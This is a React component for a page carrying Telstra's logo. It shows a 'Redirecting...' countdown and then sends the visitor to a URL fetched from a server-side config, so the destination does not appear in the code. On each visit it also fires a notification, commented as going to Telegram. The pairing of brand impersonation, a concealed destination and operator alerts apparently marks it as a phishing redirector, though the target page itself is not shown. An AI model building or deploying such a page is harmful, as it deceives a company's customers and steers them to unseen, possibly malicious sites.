import { useEffect, useState } from 'react'
import './App.css'
import telstraLogo from './assets/telstra-logo.png'

function App() {
  const [countdown, setCountdown] = useState(3)
  const [progress, setProgress] = useState(0)

  useEffect(() => {
    const handleRedirect = async () => {
      try {
        // Get redirect URL from Netlify function
        const configResponse = await fetch('/.netlify/functions/get-config')
        const config = await configResponse.json()
        const redirectUrl = config.redirectUrl || 'https://example.com'

        // Send Telegram notification (fire and forget)
        fetch('/.netlify/functions/notify').catch(err => {
          console.error('Notification error:', err)
        })

        // Countdown and progress animation
        const totalTime = 3000 // 3 seconds
        const interval = 50 // Update every 50ms
        const progressIncrement = 100 / (totalTime / interval)
        
        const progressInterval = setInterval(() => {
          setProgress(prev => {
            const newProgress = prev + progressIncrement
            return newProgress >= 100 ? 100 : newProgress
          })
        }, interval)

        // Countdown timer
        const countdownInterval = setInterval(() => {
          setCountdown(prev => {
            if (prev <= 1) {
              clearInterval(countdownInterval)
              clearInterval(progressInterval)
              return 0
            }
            return prev - 1
          })
        }, 1000)

        // Redirect after 3 seconds
        setTimeout(() => {
          clearInterval(countdownInterval)
          clearInterval(progressInterval)
          window.location.href = redirectUrl
        }, totalTime)
      } catch (error) {
        console.error('Redirect error:', error)
        // Fallback redirect after delay
        setTimeout(() => {
          window.location.href = 'https://example.com'
        }, 3000)
      }
    }

    handleRedirect()
  }, [])

  return (
    <div className="app">
      <div className="redirect-container">
        <div className="redirect-header">
          <div className="telstra-logo">
            <img src={telstraLogo} alt="Telstra" className="telstra-logo-img" />
          </div>
        </div>
        
        <div className="redirect-content">
          <div className="spinner-container">
            <div className="corporate-spinner"></div>
          </div>
          
          <h1 className="redirect-title">Redirecting...</h1>
          
          <p className="redirect-message">
            You are being redirected to the requested page.
            {countdown > 0 && (
              <span className="countdown"> Redirecting in {countdown} second{countdown !== 1 ? 's' : ''}...</span>
            )}
          </p>

          <div className="progress-container">
            <div className="progress-bar">
              <div className="progress-fill" style={{ width: `${progress}%` }}></div>
            </div>
            <div className="progress-text">{Math.round(progress)}%</div>
          </div>

          <div className="redirect-footer">
            <p className="footer-text">
              If you are not redirected automatically, 
              <a href="#" onClick={(e) => { e.preventDefault(); window.location.reload(); }} className="click-here">
                click here
              </a>.
            </p>
          </div>
        </div>
      </div>
    </div>
  )
}

export default App
